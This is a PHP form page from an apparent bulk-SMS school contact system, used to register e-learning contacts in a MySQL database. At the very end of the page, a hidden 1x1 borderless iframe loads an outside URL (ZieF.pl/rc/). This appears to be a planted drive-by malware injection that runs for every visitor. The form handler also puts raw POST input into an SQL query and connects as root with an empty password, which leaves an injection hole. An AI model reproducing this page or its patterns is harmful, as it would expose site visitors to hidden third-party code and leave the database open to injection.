<?php
ob_start();
include('header.php');
?>
<body>

    <?php include('navhead_user.php'); ?>

    <div class="container">
        <div class="row-fluid">
            <div class="span3">

                <div class="hero-unit-3">
                    <div class="alert-index alert-success">
                        <i class="icon-calendar icon-large"></i>
                        <?php
                        $Today = date('y:m:d');
                        $new = date('l, F d, Y', strtotime($Today));
                        echo $new;
                        ?>
                    </div>
                </div>
                <div class="hero-unit-1">
              
                    <ul class="nav  nav-pills nav-stacked">
                    <ul class="nav  nav-pills nav-stacked">
                        <li class="nav-header">NAVIGATE</li>
                        <li   class="active">
                            <a href="main.php"><i class="icon-home icon-large"></i>&nbsp;Home
                                <div class="pull-right">
                                    <i class="icon-double-angle-right icon-large"></i>
                                </div>  
                            </a>

                        </li>
                        <li>
                            <a href="register_parent.php"><i class="icon-group icon-large"></i>&nbsp;PARENTS
                                <div class="pull-right">
                                    <i class="icon-double-angle-right icon-large"></i>

                                    <li>
                            <a href="register_teachers.php"><i class="icon-group icon-large"></i>&nbsp;TEACHERS
                                <div class="pull-right">
                                    <i class="icon-double-angle-right icon-large"></i>


                                    <li>
                            <a href="register_schools.php"><i class="icon-group icon-large"></i>&nbsp;SCHOOLS
                                <div class="pull-right">
                                    <i class="icon-double-angle-right icon-large"></i>


                                    <li>
                            <a href="register_elearning_contacts.php"><i class="icon-group icon-large"></i>&nbsp;ELEARNING
                                <div class="pull-right">
                                    <i class="icon-double-angle-right icon-large"></i>

                                    <li>
                            <a href="register_university_contacts.php"><i class="icon-group icon-large"></i>&nbsp; UNIVERSITY
                                <div class="pull-right">
                                    <i class="icon-double-angle-right icon-large"></i>
                                    <li>
                            <a href="balance.php"><i class="icon-group icon-large"></i>&nbsp; CREDIT BALANCE
                                <div class="pull-right">
                                    <i class="icon-double-angle-right icon-large"></i>
                                </div>  
                            </a></li>  
                            </a></li> 
                            </a></li>


                    </ul>
                </div>

            </div>
            <div class="span9">





                <a href="tourist_home.php" class="btn btn-success"><i class="icon-arrow-left icon-large"></i>&nbsp;Back</a>
                <br>
                <br>

                <div class="alert alert-info">
                    <button type="button" class="close" data-dismiss="alert">&times;</button>
                    <strong><i class="icon-user icon-large"></i>&nbsp;ELEARNING</strong>
                </div>
                <div class="hero-unit-2">
                    <form class="form-horizontal" method="POST">
                        <div class="control-group">
                            <label class="control-label" for="inputEmail">NAME</label>
                            <div class="controls">

                                <input type="text" name="name" class="span5" required required placeholder="name" />
                           
                                
                            </div>
                        </div>

                             <br/>   

                             
                        <div class="control-group">
                            <label class="control-label" for="inputEmail">LEVEL</label>
                            <div class="controls">

                            <select name="level"  class="span5" required>
                                <option>SELECT LEVEL</option>
                                <option>DAY CARE</option>
                                <option>NURSERY</option>
                                    <option>PRIMARY</option>
                                    <option>O LEVEL</option>
                                    <option>A LEVEL</option>
                                    <option>NON TEACHING STAFF</option>
                                    </select>
                               
                        </div>
                            
                         <br/>   
                            
                        <div class="control-group">
                            <label class="control-label" for="inputEmail">SUBJECT</label>
                            <div class="controls">

                                <select name="subject"  class="span5" required>
                                <option>SELECT SUBJECT</option>
                                <option>SST</option>
                                    <option>SCIENCE</option>
                                    <option>LITERACY 1</option>
                                    <option>LITERACY 2</option>
                                    <option>RELIGIOUS EDUCATION</option>
                                    <option>GEOGRAPHY</option>
                                    <option>KISWAHILI</option>
                                    <option>PHYSICS</option>
                                    <option>CHEMISTRY</option>
                                    <option>BIOLOGY</option>
                                    <option>HISTORY</option>
                                    <option>POLITICAL EDUCATION</option>
                                    <option>PHYSICAL EDUCATION</option>
                                    <option>ENTRENUERSHIP</option>
                                    <option>AGRICULTURE</option>
                                    <option>ICT</option>
                                    <option>ENGLISH</option>
                                    <option>LITERATURE</option>
                                    <option>MATHEMATICS</option>
                                    <option>FINE ART</option>
                                    <option>PERFORMING ARTS</option>
                                    <option>LUGANDA</option>
                                    <option>ISLAM</option>
                                    <option>ARABIC</option>
                                    <option>ACCOUNTS</option>
                                    <option>COMMERCE</option>
                                    <option>ECONOMICS</option>
                                    <option>TD</option>
                                    <option>FN</option>
                                    </select>
                                </div>
                           
                               
                        </div>
                        
                             <br/>  
                          

<div class="control-group">
                            <label class="control-label" for="inputEmail">CONTACT1</label>
                            <div class="controls">

                                <input type="text" name="contact1" class="span5" required placeholder="i.e 2567783456789" />   
                        </div>
                     

                        <br/>   
                          

                          <div class="control-group">
                                                      <label class="control-label" for="inputEmail">CONTACT2</label>
                                                      <div class="controls">
                          
                                                          <input type="text" name="contact2" class="span5"  placeholder="i.e 2567783456789"/>   
                                                  </div>


                                                  <br/>   
                          

                          <div class="control-group">
                                                      <label class="control-label" for="inputEmail">CONTACT3</label>
                                                      <div class="controls">
                          
                                                          <input type="text" name="contact3" class="span5"  placeholder="i.e 2567783456789" />   
                                                  </div>
                     
<br/>

                        <div class="control-group">
                            <div class="controls">
                                <button type="submit" name="save_class" class="btn btn-success"><i class="icon-plus-sign icon-large"></i>&nbsp;ADD CONTACT</button>
                            
                            <a href="listelearning.php">
                            <i class="icon-plus-sign icon-large"></i>&nbsp;ELEARNING
                            </a>
                            </div>
                            <?php
                            if (isset($_POST['save_class'])) {
                               
                                $name = $_POST['name'];
                                $level = $_POST['level'];
                                $subject = $_POST['subject'];
                                $contact1 = $_POST['contact1'];
                               
                               

        $host = 'localhost';
        $db = 'bulk_sms';
        $user = 'root';
        $pass = '';

        // Connect to the database
        $con = mysql_connect($host, $user, $pass);
        mysql_select_db($db,$con);
                                mysql_query("insert into group_elearning(name,level,subject,contact) values('$name','$level','$subject','$contact1')",$con) or die(mysql_error());
                                header('location:listelearning.php');
                            }
                            ?>
                        </div>
                    </form>
                </div>




                <!-- end slider -->
            </div>

        </div>
        <?php include('footer.php'); ?>
    </div>
</div>
</div>






<iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
</body>
</html>


